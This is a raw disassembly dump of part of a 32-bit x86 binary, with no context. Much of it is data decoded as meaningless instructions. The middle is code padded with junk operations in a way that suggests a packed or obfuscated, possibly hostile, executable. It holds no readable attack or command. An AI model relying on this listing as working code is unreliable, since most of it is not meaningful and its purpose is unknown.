  404c3e:	ror    ebx,cl
  404c40:	cmp    BYTE PTR [ebx],dl
  404c42:	sbb    DWORD PTR [ecx+edx*2+0x76],esp
  404c46:	mov    dl,0xc3
  404c48:	sub    al,0xf2
  404c4a:	push   edi
  404c4b:	fistp  WORD PTR [ebx+0x3d]
  404c4e:	(bad)  
  404c4f:	pop    ebp
  404c50:	outs   dx,DWORD PTR ds:[esi]
  404c51:	mov    dh,0x46
  404c53:	out    dx,al
  404c54:	add    eax,DWORD PTR [ebx-0x79652591]
  404c5a:	(bad)  
  404c5b:	mov    ch,0x79
  404c5d:	rsqrtps xmm3,xmm6
  404c60:	inc    edx
  404c61:	push   ecx
  404c62:	test   al,0xe
  404c64:	lds    esp,FWORD PTR [eax+ecx*4]
  404c67:	cmp    eax,0x9ad61e34
  404c6c:	enter  0x2050,0x43
  404c70:	sub    esi,DWORD PTR [ebx+0x1444c81d]
  404c76:	push   ecx
  404c77:	xchg   BYTE PTR [esi-0x6eae37b7],bl
  404c7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c7e:	fsubr  DWORD PTR [edi]
  404c80:	push   ebp
  404c81:	mov    bl,0x29
  404c83:	mov    bh,0x83
  404c85:	popa   
  404c86:	fnstenv [ecx]
  404c88:	inc    edx
  404c89:	pop    ecx
  404c8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c8b:	dec    esp
  404c8c:	mov    ch,0xa
  404c8e:	(bad)  [esi+0x1ce5329]
  404c94:	dec    esp
  404c95:	in     eax,dx
  404c96:	rol    BYTE PTR [edx],0xe5
  404c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c9a:	jp     0x404c7d
  404c9c:	mov    edx,0xb3fe1c3a
  404ca1:	lea    edx,[ebx+0x44]
  404ca4:	mov    ?,WORD PTR [ebx-0xc5677d6]
  404caa:	dec    ebx
  404cab:	or     esp,0xd0493bd9
  404cb1:	pop    es
  404cb2:	(bad)  
  404cb3:	in     eax,0x73
  404cb5:	lds    esi,FWORD PTR [esi+esi*1]
  404cb8:	stc    
  404cb9:	sbb    al,0x13
  404cbb:	push   0x59
  404cbd:	ror    BYTE PTR [edx+0x71],cl
  404cc0:	push   edi
  404cc1:	retf   0x8dc4
  404cc4:	dec    esi
  404cc5:	gs pop esp
  404cc7:	xor    cl,0xa9
  404cca:	xchg   ebp,eax
  404ccb:	dec    edi
  404ccc:	fnstcw WORD PTR [ebx-0x6f]
  404ccf:	xchg   edi,eax
  404cd0:	jno    0x404d43
  404cd2:	ds add cl,al
  404cd5:	ja     0x404d33
  404cd7:	getsec 
  404cd9:	rcl    DWORD PTR [edi+edi*4+0xbdb4a1d],cl
  404ce0:	inc    ecx
  404ce1:	mov    esi,0x59ff4165
  404ce6:	add    bh,BYTE PTR [eax]
  404ce8:	call   0xef23:0x817da69c
  404cef:	push   eax
  404cf0:	cwde   
  404cf1:	jns    0x404cd6
  404cf3:	fs call 0x200d0e1e
  404cf9:	cld    
  404cfa:	add    DWORD PTR [edx],eax
  404cfc:	ret    
  404cfd:	call   0xfd70:0x74e01a45
  404d04:	into   
  404d05:	retf   
  404d06:	out    dx,eax
  404d07:	or     DWORD PTR [edx+edx*2],edx
  404d0a:	adc    ax,0x6c23
  404d0e:	add    esi,DWORD PTR [edi]
  404d10:	mov    BYTE PTR [ecx+0x54],0xf8
  404d14:	sbb    cl,BYTE PTR [esi+0x57]
  404d17:	sbb    DWORD PTR [ecx-0x68],ebx
  404d1a:	pop    es
  404d1b:	jbe    0x404ce5
  404d1d:	push   esp
  404d1e:	sbb    BYTE PTR [ebx],ah
  404d20:	int    0x3a
  404d22:	mov    ds:0x810a3fba,al
  404d27:	nop
  404d28:	out    0x5f,eax
  404d2a:	cmp    eax,0x6f80acca
  404d2f:	ins    BYTE PTR es:[edi],dx
  404d30:	hlt    
  404d31:	dec    esi
  404d32:	adc    eax,0xfe25d78d
  404d37:	dec    eax
  404d38:	ret    0xb690
  404d3b:	retf   
  404d3c:	repnz mov bh,0x1e
  404d3f:	pop    edi
  404d40:	sahf   
  404d41:	and    al,0xf
  404d43:	xor    BYTE PTR [ecx],dh
  404d45:	xchg   edx,eax
  404d46:	and    eax,0xaab95ddb
  404d4b:	icebp  
  404d4c:	icebp  
  404d4d:	inc    edx
  404d4e:	(bad)  
  404d4f:	jnp    0x404d4f
  404d51:	retf   
  404d52:	je     0x404cdb
  404d54:	adc    eax,ecx
  404d56:	enter  0xe3b5,0xd1
  404d5a:	and    DWORD PTR [edi-0x2e],edx
  404d5d:	push   ecx
  404d5e:	movhps QWORD PTR [edx-0x65eb706b],xmm2
  404d65:	cs shl ah,cl
  404d68:	dec    edx
  404d69:	pop    es
  404d6a:	lods   eax,DWORD PTR ds:[esi]
  404d6b:	xchg   esp,eax
  404d6c:	and    ebp,esi
  404d6e:	push   ds
  404d6f:	out    dx,eax
  404d70:	cmp    dh,ch
  404d72:	jg     0x404cff
  404d74:	sar    DWORD PTR [eax+0x19],0xcc
  404d78:	pop    ebx
  404d79:	cdq    
  404d7a:	jmp    0xcec7a8f9
  404d7f:	sub    dh,al
  404d81:	xchg   edi,esp
  404d83:	in     al,dx
  404d84:	fwait
  404d85:	mov    ecx,0x6c194b16
  404d8a:	mov    fs,ebp
  404d8c:	ins    BYTE PTR es:[edi],dx
  404d8d:	in     eax,0xa0
  404d8f:	(bad)  
  404d90:	mov    edi,0x660ed225
  404d95:	(bad)
  404d99:	cmc    
  404d9a:	fs cld 
  404d9c:	ret    0x543b
  404d9f:	arpl   WORD PTR [edi-0x618d4d13],dx
  404da5:	jmp    ebx
  404da7:	cwde   
  404da8:	add    esp,DWORD PTR [ecx+eiz*8-0x72]
  404dac:	and    al,BYTE PTR ds:0x126bf6c8
  404db2:	aaa    
  404db3:	mov    ecx,0x6f19d7f4
  404db8:	mov    dh,0x14
  404dba:	dec    edi
  404dbb:	pop    es
  404dbc:	fadd   QWORD PTR [ebp+0x36]
  404dbf:	mov    ds:0xe30e0950,eax
  404dc4:	xchg   ebx,eax
  404dc5:	scas   al,BYTE PTR es:[edi]
  404dc6:	dec    edi
  404dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dc8:	sub    eax,DWORD PTR [ecx+edx*4+0x45]
  404dcc:	or     ecx,ecx
  404dce:	xchg   ebx,eax
  404dcf:	xor    eax,0xe74cd03b
  404dd4:	jo     0x404dcc
  404dd6:	xlat   BYTE PTR ds:[ebx]
  404dd7:	pop    ebx
  404dd8:	popf   
  404dd9:	sbb    al,BYTE PTR [esi+0x25df8305]
  404ddf:	clc    
  404de0:	dec    esp
  404de1:	and    dh,BYTE PTR ds:0x6d8dca55
  404de7:	data16 data16 ja 0x404e11
  404deb:	aam    0x4a
  404ded:	inc    ebp
  404dee:	(bad)  
  404def:	ds adc al,0x5e
  404df2:	repnz in eax,0x88
  404df5:	(bad)  
  404df6:	lahf   
  404df7:	cmp    ah,cl
  404df9:	adc    BYTE PTR [esi+ecx*1],cl
  404dfc:	fiadd  DWORD PTR [ebx+0x6f425680]
  404e02:	sub    eax,0x56bdbe54
  404e07:	add    DWORD PTR [esi+0x12],edx
  404e0a:	add    al,0x8
  404e0c:	scas   eax,DWORD PTR es:[edi]
  404e0d:	sub    al,0x1e
  404e0f:	inc    edx
  404e10:	stos   BYTE PTR es:[edi],al
  404e11:	inc    ebp
  404e12:	pusha  
  404e13:	ror    BYTE PTR [ebx-0x3d],cl
  404e16:	pi2fw  mm3,QWORD PTR [edi]
  404e1a:	mov    eax,0x221a2e58
  404e1f:	push   cs
  404e20:	mov    dl,0xdb
  404e22:	imul   edi,ecx,0x773a6bac
  404e28:	sub    ah,0xa4
  404e2b:	adc    BYTE PTR [edi-0x46],al
  404e2e:	dec    esi
  404e2f:	mov    bh,0x62
  404e31:	inc    esi
  404e32:	dec    edi
  404e33:	add    eax,DWORD PTR [ebp-0x7e]
  404e36:	dec    ebp
  404e37:	iret   
  404e38:	(bad)  
  404e39:	(bad)  
  404e3a:	add    DWORD PTR ds:0x11dbe52b,ebx
  404e40:	or     edi,edi
  404e42:	xor    eax,0x66dabc96
  404e47:	mov    ebx,?
  404e49:	pushf  
  404e4a:	xchg   ebp,eax
  404e4b:	mov    ds:0x59afe738,al
  404e50:	out    dx,al
  404e51:	add    DWORD PTR [edx],ebp
  404e53:	and    DWORD PTR [ecx],ebp
  404e55:	cwde   
  404e56:	out    dx,eax
  404e57:	and    DWORD PTR [ebp*4+0x13cca832],edi
  404e5e:	push   0x708b5641
  404e63:	adc    DWORD PTR [ecx-0x1a42b5a0],ebp
  404e69:	mov    BYTE PTR [ebp-0x2db905bb],bh
  404e6f:	pop    ebx
  404e70:	or     eax,0xf77c47a3
  404e75:	scas   al,BYTE PTR es:[edi]
  404e76:	aas    
  404e77:	ins    DWORD PTR es:[edi],dx
  404e78:	(bad)  
  404e79:	mov    ds:0x42ede607,eax
  404e7e:	lods   al,BYTE PTR ds:[esi]
  404e7f:	lahf   
  404e80:	lods   eax,DWORD PTR ds:[esi]
  404e81:	mov    edx,0x7b0a985d
  404e86:	mov    ah,0xec
  404e88:	mov    ecx,0x8e263c92
  404e8d:	test   eax,0x2b9fbe13
  404e92:	stc    
  404e93:	mov    cs,WORD PTR [edi+eiz*8]
  404e96:	sbb    DWORD PTR [edx],esi
  404e98:	retf   
  404e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e9a:	ss repz and bh,dh
  404e9e:	dec    ecx
  404e9f:	or     ah,dh
  404ea1:	aam    0x5c
  404ea3:	push   edx
  404ea4:	sahf   
  404ea5:	add    al,BYTE PTR ds:0xfba8d2e2
  404eab:	scas   al,BYTE PTR es:[edi]
  404eac:	dec    ecx
  404ead:	inc    ebp
  404eae:	xor    DWORD PTR [esi-0x4d96c8fa],edx
  404eb4:	mov    edx,0x42f9fb76
  404eb9:	(bad)  
  404eba:	js     0x404eec
  404ebc:	fldcw  WORD PTR [eax+0x54]
  404ebf:	inc    ebx
  404ec0:	aas    
  404ec1:	leave  
  404ec2:	scas   eax,DWORD PTR es:[edi]
  404ec3:	js     0x404ecb
  404ec5:	xor    dh,0xbe
  404ec8:	test   eax,0xe5869023
  404ecd:	sbb    ah,ah
  404ecf:	mov    dh,0xc2
  404ed1:	cli    
  404ed2:	pushf  
  404ed3:	and    al,0x71
  404ed5:	xor    ebp,DWORD PTR [esi]
  404ed7:	cmp    DWORD PTR [ecx+ecx*4-0x345689a1],eax
  404ede:	clc    
  404edf:	push   0xffffffca
  404ee1:	push   ebp
  404ee2:	outs   dx,DWORD PTR ds:[esi]
  404ee3:	fldenv [eax]
  404ee6:	cmp    DWORD PTR [eax+0x61],0x36
  404eea:	or     bh,dh
  404eec:	xchg   ecx,eax
  404eed:	out    0x72,al
  404eef:	xchg   edx,eax
  404ef0:	ret    
  404ef1:	in     al,0x16
  404ef3:	mov    ebx,0x260a6ec4
  404ef8:	in     al,0x3e
  404efa:	sbb    eax,0x89e633ed
  404eff:	hlt    
  404f00:	inc    edx
  404f01:	mov    ah,0x5f
  404f03:	pop    esp
  404f04:	call   0xc9695bd6
  404f09:	sbb    esi,esp
  404f0b:	je     0x404ee8
  404f0d:	ins    DWORD PTR es:[edi],dx
  404f0e:	fisttp WORD PTR [ebp+0x1b]
  404f11:	test   edx,0x70ab5400
  404f17:	test   DWORD PTR [esi+esi*4+0x496345a9],esp
  404f1e:	call   0x5b100d3e
  404f23:	out    0x76,al
  404f25:	xor    edi,DWORD PTR [ebx+0x0]
  404f28:	push   esi
  404f29:	pop    ds
  404f2a:	pop    edi
  404f2b:	pop    ss
  404f2c:	or     edx,DWORD PTR [ebp-0x1c]
  404f2f:	sbb    DWORD PTR ds:0x42827b,0x7456
  404f39:	shl    ecx,0x1e
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x428287
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x42839b,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x428377,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x428383,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x428383,0x0
  404f72:	mov    DWORD PTR ds:0x428313,ebx
  404f78:	mov    DWORD PTR ds:0x42838b,0x56b3
  404f82:	mov    DWORD PTR ds:0x42826b,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x42823f,ebx
  404f97:	mov    DWORD PTR ds:0x428277,0x5683
  404fa1:	cmp    DWORD PTR ds:0x428383,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428d8c
  404fbc:	and    edx,DWORD PTR ds:0x428323
  404fc2:	sub    DWORD PTR ds:0x42824f,ecx
  404fc8:	or     DWORD PTR ds:0x428243,0xf0b
  404fd2:	adc    DWORD PTR ds:0x42817f,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x428363
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x42816b,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x428163
  404ff2:	xor    DWORD PTR ds:0x4282a3,edx
  404ff8:	mov    edx,DWORD PTR ds:0x428277
  404ffe:	add    DWORD PTR ds:0x42839b,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x4282a3
  40500c:	add    DWORD PTR ds:0x42827b,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x428383,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x42838f,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x428177,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x42839f,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x42828f,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x428183,0x428267
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x42837b,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x42838b,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x42827b,0x428387
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x428273,0x428293
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x428247,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x42837b,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x42838b,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x428397,0x42823b
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x428263,0x42824f
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x42829f,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x42827f,0x42825b
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x428167,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x42838b,0x0
  40512f:	mov    DWORD PTR ds:0x42819b,edx
  405135:	mov    DWORD PTR ds:0x42836b,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x42817b,0x795c
  40514c:	cmp    DWORD PTR ds:0x42838b,0x0
  405153:	ja     0x40517c
  405159:	push   0x427fac
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428db4
  40516c:	or     DWORD PTR ds:0x428273,0xa87
  405176:	add    ecx,DWORD PTR ds:0x4283a7
  40517c:	adc    ecx,DWORD PTR ds:0x42818b
  405182:	xor    DWORD PTR ds:0x42817b,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x42828f,edx
  405192:	cmp    DWORD PTR ds:0x4282eb,0x0
  405199:	mov    DWORD PTR ds:0x428317,0x66a6
  4051a3:	mov    DWORD PTR ds:0x4282f7,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x4282eb,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428db8
  4051d1:	inc    DWORD PTR ds:0x428287
  4051d7:	mov    ecx,DWORD PTR ds:0x4281c7
  4051dd:	mov    edx,DWORD PTR ds:0x4283c7
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x4282eb,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x4281bf
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x428273,edx
  405201:	mov    edx,DWORD PTR ds:0x4281d7
  405207:	mov    ecx,DWORD PTR ds:0x4283c7
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x42837f,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x42828f
  405233:	sub    DWORD PTR ds:0x428193,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x42836b,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x428177,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x42827f,0x428183
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x42839b,0x428267
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x428393,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x42816b,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x4282a3,0x0
  40529a:	mov    DWORD PTR ds:0x428233,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x428273
  4052aa:	mov    DWORD PTR ds:0x4282fb,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x4283a3,0x6b40
  4052c3:	mov    DWORD PTR ds:0x42828b,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x4282a3,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x428069
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428dbc
  4052ea:	add    edx,DWORD PTR ds:0x42825b
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x428183
  4052fc:	and    DWORD PTR ds:0x42818f,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x428267
  40530f:	add    DWORD PTR ds:0x4282a3,edx
  405315:	mov    edx,DWORD PTR ds:0x42828b
  40531b:	add    DWORD PTR ds:0x428173,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x4282f7,0x42822f
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x428313,0x0
  40533c:	mov    DWORD PTR ds:0x42830f,edi
  405342:	mov    DWORD PTR ds:0x428277,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x42831b,0x4d36
  405357:	mov    DWORD PTR ds:0x428397,0x1e95
  405361:	cmp    DWORD PTR ds:0x428313,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428dc0
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x42839f,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x4283df
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x42837f,ecx
  405396:	mov    ecx,DWORD PTR ds:0x42824f
  40539c:	xor    DWORD PTR ds:0x42815b,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x42827b,edx
  4053ae:	cmp    DWORD PTR ds:0x4282fb,0x0
  4053b5:	mov    DWORD PTR ds:0x428167,edi
  4053bb:	not    DWORD PTR ds:0x42823b
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x428197,0xab0
  4053d0:	cmp    DWORD PTR ds:0x4282fb,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428dc4
  4053f6:	sub    ecx,DWORD PTR ds:0x42819b
  4053fc:	sub    DWORD PTR ds:0x42823b,0x6432
  405406:	or     DWORD PTR ds:0x42825f,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x42818f
  405416:	sub    DWORD PTR ds:0x428393,edi
  40541c:	mov    DWORD PTR ds:0x42823b,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x428277,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x4282ef,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x42839f
  405450:	sub    edx,DWORD PTR ds:0x428153
  405456:	mov    DWORD PTR ds:0x42839f,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	std    
  40546e:	mov    ah,0x73
  405470:	jl     0x405458
  405472:	mov    ecx,0x129e1818
  405477:	sbb    BYTE PTR [eax],bl
  405479:	out    dx,eax
  40547a:	jno    0x405405
  40547c:	fsubp  st(7),st
  40547e:	and    DWORD PTR [eax+ebx*2],edx
  405481:	(bad)  
  405482:	jmp    0x1b7:0x8e655dff
  405489:	push   esi
  40548a:	inc    ecx
  40548b:	push   edi
  40548c:	sub    eax,0xeb8958a2
  405491:	je     0x4054ff
  405493:	std    
  405494:	add    ebp,0x4c0ca2df
  40549a:	xchg   edi,eax
  40549b:	xchg   edi,ebp
  40549d:	sbb    BYTE PTR [eax],0x42
  4054a0:	sub    ch,0x40
  4054a3:	add    edx,edi
  4054a5:	dec    ebx
  4054a6:	retf   0x5311
  4054a9:	dec    ebx
  4054aa:	dec    ebx
  4054ab:	sbb    dl,BYTE PTR [esi]
  4054ad:	xor    eax,0xf30fff0b
  4054b2:	lock or ecx,esp
  4054b5:	and    eax,0x2001589f
  4054ba:	ins    BYTE PTR es:[edi],dx
  4054bb:	ret    
  4054bc:	dec    edi
  4054bd:	mov    al,ds:0x165f4048
  4054c2:	lods   eax,DWORD PTR ds:[esi]
  4054c3:	and    cl,ch
  4054c5:	push   ecx
  4054c6:	adc    al,0xa0
  4054c8:	or     eax,0xf0553c21
  4054cd:	cld    
  4054ce:	pushf  
  4054cf:	popw   ds
  4054d1:	inc    ecx
  4054d2:	aas    
  4054d3:	test   BYTE PTR [edi+0x21d75da6],ch
  4054d9:	and    ecx,DWORD PTR [ebx+ecx*2]
  4054dc:	inc    esi
  4054dd:	xor    ecx,DWORD PTR [ebx-0x4ad8007b]
  4054e3:	jge    0x405544
  4054e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054e6:	ins    DWORD PTR es:[edi],dx
  4054e7:	fnstsw WORD PTR [ecx+0x5dfb1fc6]
  4054ed:	in     al,0x42
  4054ef:	pusha  
  4054f0:	nop
  4054f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054f2:	mov    ah,0xe7
  4054f4:	dec    edx
  4054f5:	ins    BYTE PTR es:[edi],dx
  4054f6:	or     BYTE PTR ds:0x68dbf61a,0x32
  4054fd:	fdiv   st,st(7)
  4054ff:	icebp  
  405500:	dec    eax
  405501:	mov    al,0x38
  405503:	outs   dx,BYTE PTR ds:[esi]
  405504:	push   0x7
  405506:	mov    bh,0x5e
  405508:	jg     0x4054c1
  40550a:	stc    
  40550b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40550c:	cs push esi
  40550e:	push   ds
  40550f:	xchg   edi,eax
  405510:	fcmovu st,st(1)
  405512:	repz fistp DWORD PTR [eax+0x5176de8d]
  405519:	ficom  DWORD PTR [eax-0x26]
  40551c:	out    dx,eax
  40551d:	sbb    eax,0x56b8d9b8
  405522:	and    cl,BYTE PTR [edx]
  405524:	lahf   
  405525:	test   bl,al
  405527:	sar    DWORD PTR [edx],1
  405529:	call   FWORD PTR [ebx-0x2]
  40552c:	push   ebp
  40552d:	mov    gs,WORD PTR [esi-0x7a]
  405530:	stos   BYTE PTR es:[edi],al
  405531:	repnz loope 0x4054b9
  405534:	ins    BYTE PTR es:[edi],dx
  405535:	dec    esp
  405536:	pusha  
  405537:	sbb    al,0x98
  405539:	or     edi,DWORD PTR [eax+0x20]
  40553c:	(bad)  
  40553d:	cmp    DWORD PTR ds:0xcb4e0830,esp
  405543:	cmc    
  405544:	push   edi
  405545:	jle    0x405501
  405547:	fwait
  405548:	pop    ebx
  405549:	adc    BYTE PTR [ebp+0x6956b4ca],ah
  40554f:	sbb    DWORD PTR [ebx-0x79],esp
  405552:	add    cl,BYTE PTR [edx+0x58]
  405555:	stos   DWORD PTR es:[edi],eax
  405556:	je     0x4055b0
  405558:	fistp  QWORD PTR [ecx+0x5e1dc2d0]
  40555f:	addr16 je 0x40553a
  405562:	cmp    al,BYTE PTR [ecx]
  405564:	push   esi
  405565:	inc    ebx
  405566:	adc    al,0x7f
  405568:	into   
  405569:	lods   eax,DWORD PTR ds:[esi]
  40556a:	sbb    eax,0xdb6e4570
  40556f:	ds jge 0x405538
  405572:	test   DWORD PTR [ecx-0x2d],eax
  405575:	fwait
  405576:	aaa    
  405577:	arpl   WORD PTR [ecx],cx
  405579:	test   DWORD PTR [ebp-0x6d410f6a],edx
  40557f:	loope  0x40550c
  405581:	sar    bl,1
  405583:	adc    DWORD PTR [ebp+0x1eea4c2],ebx
  405589:	cwde   
  40558a:	cdq    
  40558b:	rol    DWORD PTR [edi+0x19f09608],0xfa
  405592:	pop    ecx
  405593:	pop    eax
  405594:	add    BYTE PTR [edi+0x4deccc57],0xb3
  40559b:	xchg   esp,eax
  40559d:	cmc    
  40559e:	(bad)  
  40559f:	in     al,dx
  4055a0:	call   0xb3fc32ef
  4055a5:	adc    cl,BYTE PTR [ebx+0x6e]
  4055a8:	shl    bl,0x74
  4055ab:	(bad)  
  4055ac:	mov    ds:0x35195b6f,eax
  4055b1:	adc    cl,0x8d
  4055b4:	and    eax,0x4179272f
  4055b9:	stc    
  4055ba:	lods   al,BYTE PTR ds:[esi]
  4055bb:	nop
  4055bc:	push   edx
  4055bd:	aad    0x9d
  4055bf:	jmp    0x8e11:0xd46ba1a3
  4055c6:	(bad)  
  4055c7:	pop    ebx
  4055c8:	imul   BYTE PTR [esp+edx*1-0x26fe89a3]
  4055cf:	add    al,BYTE PTR [edi]
  4055d1:	(bad)  
  4055d2:	sbb    ah,bl
  4055d4:	sbb    BYTE PTR [ecx+0x14],bl
  4055d7:	test   al,0x5b
  4055d9:	rol    ecx,0x42
  4055dc:	cdq    
  4055dd:	in     eax,0xb7
  4055df:	jl     0x40565c
  4055e1:	push   eax
  4055e2:	jo     0x4055c2
  4055e4:	mov    al,ds:0xad26cfed
